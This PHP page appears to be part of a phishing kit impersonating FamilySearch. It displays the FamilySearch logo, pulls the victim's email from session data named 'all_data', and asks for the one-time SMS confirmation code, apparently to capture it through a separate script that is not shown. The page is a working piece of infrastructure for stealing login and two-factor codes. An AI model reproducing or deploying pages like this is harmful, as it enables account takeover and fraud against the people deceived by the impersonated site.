<?php
include_once("./dbInput.php");
include_once("header.php");
include_once("fu.php");
if(!isset($_SESSION['all_data']['email'])){
    header("location: ./");
} 
?>

<!-- header -->
<header>
    <a class="img-div" href="./">
       <img src="./images/familysearch-tree.dc22204d2135c739.svg" alt="" />
    </a>
</header>

<!-- form otp -->
<section class="container form-body mx-auto" style="justify-self: center;">
    <div class="card bg-white mx-auto" style="max-width: 360px; padding: 20px 10px ;">
        <h5 class="m-0" style="font-weight: 600;">Enter the confirmation code from the text message.</h5>
        <hr>
        <p style="font-size: 14px;">Let us know if this email address belongs to you. Enter the code in the SMS sent to <b><?= $_SESSION['all_data']['email'] ?? "example@gmail.com" ?></b></p>
        <form action="" autocomplete="off">
            <div class="col mb-4" style="width: 50%;">
                    <div class="form-outline">
                      <input type="number" id="OTP" class="form-control" name="OTP" value="<?= $OTP ?? null ?>"/>
                      <label class="form-label" for="form3Example2"
                        >OTP</label
                      >
                    </div>
            </div>

            <!-- Submit button -->
            <div>
        <button id="submitOTP" class="btn btn-primary btn-block">Submit</button>
            </div>
        </form>
    </div>
</section>


<?php 
include_once("footer.php");
?>